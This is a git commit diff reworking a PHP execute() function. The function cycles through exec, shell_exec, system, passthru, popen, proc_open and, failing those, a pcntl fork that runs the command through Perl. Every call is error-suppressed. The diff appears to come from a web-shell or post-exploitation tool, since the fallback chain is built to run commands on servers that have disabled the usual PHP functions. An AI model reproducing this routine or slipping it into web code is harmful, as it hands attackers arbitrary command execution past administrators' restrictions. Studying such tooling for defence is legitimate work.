5c670437bc16a81f497a2ace3b9085d1ce789abb
nil0x42 <nil0x42@gmail.com>
2014-11-05 19:54:26 +0100

    Fix return value bug on execute() phplib function.

--- src/api/php-functions/execute.php
+++ src/api/php-functions/execute.php
@@ -17,83 +17,82 @@ function execute($cmd)
 {
     $res = '';
 
-    if (!empty($cmd))
+    if (@function_exists('exec'))
     {
-        if (@function_exists('exec'))
+        @exec($cmd, $res);
+        $res = implode("\n", $res);
+    }
+    elseif (@function_exists('shell_exec'))
+    {
+        $res = @shell_exec($cmd);
+    }
+    elseif (@function_exists('system'))
+    {
+        @ob_start();
+        @system($cmd);
+        $res = @ob_get_contents();
+        @ob_end_clean();
+    }
+    elseif (@function_exists('passthru'))
+    {
+        @ob_start();
+        @passthru($cmd);
+        $res = @ob_get_contents();
+        @ob_end_clean();
+    }
+    elseif (@is_resource($f = @popen($cmd, 'r')))
+    {
+        if (@function_exists('fread') && @function_exists('feof'))
         {
-            @exec($cmd, $res);
-            $res = join("\n", $res);
+            while (!@feof($f))
+                $res .= @fread($f, 1024);
         }
-        elseif (@function_exists('shell_exec'))
-            $res = @shell_exec($cmd);
-        elseif (@function_exists('system'))
+        elseif (@function_exists('fgets') && @function_exists('feof'))
         {
-            @ob_start();
-            @system($cmd);
-            $res = @ob_get_contents();
-            @ob_end_clean();
+            while (!@feof($f))
+                $res .= @fgets($f, 1024);
         }
-        elseif (@function_exists('passthru'))
+        @pclose($f);
+    }
+    elseif (@is_resource($f = @proc_open($cmd, array(1 => array("pipe", "w")), $pipes)))
+    {
+        if (@function_exists('fread') && @function_exists('feof'))
         {
-            @ob_start();
-            @passthru($cmd);
-            $res = @ob_get_contents();
-            @ob_end_clean();
+            while (!@feof($pipes[1]))
+                $res .= @fread($pipes[1], 1024);
         }
-        elseif (@is_resource($f = @popen($cmd, 'r')))
+        elseif (@function_exists('fgets') && @function_exists('feof'))
         {
-            $res = "";
-            if (@function_exists('fread') && @function_exists('feof'))
-            {
-                while (!@feof($f))
-                    $res .= @fread($f, 1024);
-            }
-            elseif (@function_exists('fgets') && @function_exists('feof'))
-            {
-                while (!@feof($f))
-                    $res .= @fgets($f, 1024);
-            }
-            @pclose($f);
+            while (!@feof($pipes[1]))
+                $res .= @fgets($pipes[1],1024);
         }
-        elseif (@is_resource($f = @proc_open($cmd, array(1 => array("pipe", "w")), $pipes)))
+        @proc_close($f);
+    }
+    elseif (@function_exists('pcntl_exec') && @function_exists('pcntl_fork'))
+    {
+        $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
+        $pid = @pcntl_fork();
+        if ($pid == -1)
+            $res .= '[-] Could not children fork. Exit';
+        elseif ($pid)
         {
-            $res = "";
-            if (@function_exists('fread') && @function_exists('feof'))
-            {
-                while (!@feof($pipes[1]))
-                    $res .= @fread($pipes[1], 1024);
-            }
-            elseif (@function_exists('fgets') && @function_exists('feof'))
-            {
-                while (!@feof($pipes[1]))
-                    $res .= @fgets($pipes[1],1024);
-            }
-            @proc_close($f);
-        }
-        elseif (@function_exists('pcntl_exec') && @function_exists('pcntl_fork'))
-        {
-            $res = '[~] Blind Command Execution via [pcntl_exec]\n\n';
-            $pid = @pcntl_fork();
-            if ($pid == -1)
-                $res .= '[-] Could not children fork. Exit';
-            elseif ($pid)
-            {
-                if (@pcntl_wifexited($status))
-                    $res .= '[+] Done! Command "' . $cmd . '" successfully executed.';
-                else
-                    $res .= '[-] Error. Command incorrect.';
-            }
+            if (@pcntl_wifexited($status))
+                $res .= '[+] Done! Command "' . $cmd . '" successfully executed.';
             else
-            {
-                $cmd = array(" -e 'system(\"$cmd\")'");
-                if (@pcntl_exec('/usr/bin/perl', $cmd))
-                    exit (0);
-                if (@pcntl_exec('/usr/local/bin/perl', $cmd))
-                    exit (0);
-                die ();
-            }
+                $res .= '[-] Error. Command incorrect.';
+        }
+        else
+        {
+            $cmd = array(" -e 'system(\"$cmd\")'");
+            if (@pcntl_exec('/usr/bin/perl', $cmd))
+                exit (0);
+            if (@pcntl_exec('/usr/local/bin/perl', $cmd))
+                exit (0);
+            die ();
         }
     }
+    if (!is_string($res) || empty($res))
+        return ("");
     return ($res);
 }
 
